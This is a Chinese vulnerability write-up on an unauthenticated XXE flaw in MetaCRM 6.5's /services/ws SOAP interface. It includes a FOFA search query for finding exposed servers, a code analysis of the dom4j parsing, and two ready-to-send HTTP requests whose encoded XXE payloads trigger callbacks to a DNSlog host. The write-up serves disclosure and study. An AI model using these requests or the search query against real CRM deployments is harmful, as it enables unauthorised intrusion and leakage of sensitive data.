---
title: "美特CRM ws XXE漏洞"
source: https://mrxn.net/jswz/metasoft-services-ws-dom4j-xxe.html
asset_dir: assets/美特crm-ws-xxe漏洞
---

# 美特CRM ws XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/11 08:26
- 957浏览
- [0评论](#comment)
- 1小时阅读

深入探索

鉴权

软件

验证

---

# 漏洞简介

MetaCRM是一款智能平台化CRM[软件](#),通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM ws 接口的 accessSessionValue、corditionXml 等多个方法的参数存在[XXE漏洞](https://mrxn.net/tag/XXE)，未授权攻击者可利用该漏洞获取系统敏感信息。

客户关系管理

# 影响版本

CRM6.5

# fofa语法

> `body="/common/scripts/basic.js" && body="www.metacrm.com.cn"`

# 漏洞分析

先看 web.xml 里对于 services 接口的定义

```
<servlet>
    <servlet-name>CXFServlet</servlet-name>
    <servlet-class>
        org.apache.cxf.transport.servlet.CXFServlet
    </servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>CXFServlet</servlet-name>
    <url-pattern>/services/*</url-pattern>
</servlet-mapping>
```

再看下 `WEB-INF/spring/cxf-config.xml`

深入探索

Nessus

安全研究报告

Web安全课程

```
<?xml version="1.0" encoding="UTF-8"?>
 <beans xmlns="http://www.springframework.org/schema/beans"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xmlns:jaxws="http://cxf.apache.org/jaxws"
                 xsi:schemaLocation="
                       http://www.springframework.org/schema/beans

                       http://www.springframework.org/schema/beans/spring-beans.xsd
                       http://cxf.apache.org/jaxws http://cxf.apache.org/schemas/jaxws.xsd">

    <import resource="classpath:META-INF/cxf/cxf.xml"/>
    <!-- <import resource="classpath:META-INF/cxf/cxf-extension-soap.xml"/> -->
    <import resource="classpath:META-INF/cxf/cxf-servlet.xml"/>
    <jaxws:endpoint implementor="com.metasoft.ws.service.data.CommonOperationServImpl" address="/ws" />
</beans>
```

深入探索

SQL注入检测工具

VPN服务

传输层安全性协议

根据上面两个的定义，那么访问的URL 就是 `/services/ws` 。其次是根据 Apache CXF 的 WebService 服务发布相关知识，我们只需在路径后添加 `?wsdl` 即可获得完整服务列表：

漏洞修复方案

[![美特CRM ws XXE漏洞](images/img-001-3e9d50c249e0.webp)](https://image.mrxn.net/1f03b0b59ced43238fe0507da8688e42.webp)

然后借助 burpsuite 的 wslder 插件解析出来就可以测试了，以其中 `commonQueryServ`、`commonCheckServ`为例，

看下其业务实现中，`accessSessionValue` 被带入 `getDocument4String`

[![美特CRM ws XXE漏洞](images/img-002-89b04abaf270.webp)](https://image.mrxn.net/f7a3ee2282714f478f44ffeb440eb359.webp)

`getDocument4String` 实现如下

物流软件安全

```
import org.dom4j.Attribute;
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
......
public static Document getDocument4String(String xml) {
        Document xmlDocument = null;

        try {
            if (!StringUtil.isEmpty(xml)) {
                xmlDocument = DocumentHelper.parseText(xml);
            }
        } catch (DocumentException e) {
            Debug.error("", e);
        }

        return xmlDocument;
    }
```

在看下 dom4j 的版本：1.6.1 ，这个版本的`SAXReader`（`DocumentHelper` 内部调用）默认启用外部实体解析，因此存在[XXE漏洞](https://mrxn.net/tag/XXE)。

[![美特CRM ws XXE漏洞](images/img-003-912ca9bc8679.webp)](https://image.mrxn.net/5408e588cba54e8c9804aa998aea9c65.webp)

另外 `commonQueryServ` 参数 `corditionXml` 被带入 `queryServAnalysis` 方法中最终也会调用 `DocumentUtil.getDocument4String(corditionXml);`，因此此参数同样存在XXE漏洞

网络安全

[![美特CRM ws XXE漏洞](images/img-004-e96c7e1d6766.webp)](https://image.mrxn.net/8ec753bc12ad4371b770dfbb2c9dc315.webp)

[![美特CRM ws XXE漏洞](images/img-005-f061b57eb0a6.webp)](https://image.mrxn.net/19234d1c3c72485eb23298d956b6d0c3.webp)

# 漏洞复现

```
POST /services/ws HTTP/1.1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: metasoft.mrxn.net

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:data="http://data.service.ws.metasoft.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <data:commonQueryServ>
         <!--type: string-->
         <accessSessionValue>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;&#xa;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x72;&#x6f;&#x6f;&#x74;&#x20;&#x5b;&#xa;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x78;&#x78;&#x31;&#x2e;&#x6d;&#x72;&#x78;&#x6e;&#x2e;&#x64;&#x6e;&#x73;&#x6c;&#x6f;&#x67;&#x2e;&#x70;&#x74;&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#xa;&#x25;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x3b;&#x5d;&#x3e;&#xa;&#x3c;&#x72;&#x6f;&#x6f;&#x74;&#x2f;&#x3e;</accessSessionValue>
         <!--type: string-->
         <objectname>sonoras</objectname>
         <!--type: string-->
         <corditionxml>quae</corditionxml>
      </data:commonQueryServ>
   </soapenv:Body>
</soapenv:Envelope>
```

[![美特CRM ws XXE漏洞](images/img-006-9b48d768b913.webp)](https://image.mrxn.net/7873257ac90f41f4ba38ae220a72dd3c.webp)

DNSLOG平台成功收到请求

以及 `commonCheckServ` 的验证

```
POST /services/ws HTTP/1.1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: metasoft.mrxn.net

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:data="http://data.service.ws.metasoft.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <data:commonCheckServ>
         <!--type: string-->
         <accessSessionValue>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;&#xa;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x72;&#x6f;&#x6f;&#x74;&#x20;&#x5b;&#xa;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x78;&#x78;&#x31;&#x2e;&#x6d;&#x72;&#x78;&#x6e;&#x2e;&#x64;&#x6e;&#x73;&#x6c;&#x6f;&#x67;&#x2e;&#x70;&#x74;&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#xa;&#x25;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x3b;&#x5d;&#x3e;&#xa;&#x3c;&#x72;&#x6f;&#x6f;&#x74;&#x2f;&#x3e;</accessSessionValue>
         <!--type: string-->
         <objectname>sonoras</objectname>
         <!--type: string-->
         <recordid>quae</recordid>
      </data:commonCheckServ>
   </soapenv:Body>
</soapenv:Envelope>
```

也同样可以收到请求

客户关系管理

[![美特CRM ws XXE漏洞](images/img-007-f66686ca7178.webp)](https://image.mrxn.net/4409723d31944e50873c7225a4647ad8.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
